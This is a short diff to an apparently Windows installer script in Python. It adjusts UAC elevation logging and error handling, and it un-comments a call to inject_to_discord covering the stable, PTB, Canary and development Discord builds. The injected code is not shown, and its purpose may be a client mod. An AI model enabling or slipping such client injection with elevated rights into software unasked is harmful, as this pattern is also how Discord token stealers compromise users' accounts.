@@ -162,18 +162,18 @@ def install_dependencies():
         "/nocloseapplications",
     ]
 
-    log.info(f"Attempting to run command: {' '.join(command_to_run)}")
+    log.debug(f"Attempting to run command: {' '.join(command_to_run)}")
+    log.info("Please respond to the UAC prompt on your screen.")
 
     if not request_elevation(command_to_run):
         log.critical("Failed to elevate the process. The command was not executed.")
-        sys.exit(1)
-
-    log.info("Please respond to the UAC prompt on your screen.")
+        return
 
 
 if __name__ == "__main__":
 
-    # inject_to_discord(install_builds=["stable", "ptb", "canary", "development"])
+    inject_to_discord(install_builds=["stable", "ptb", "canary", "development"])
+
     install_dependencies()
 
     time.sleep(10)
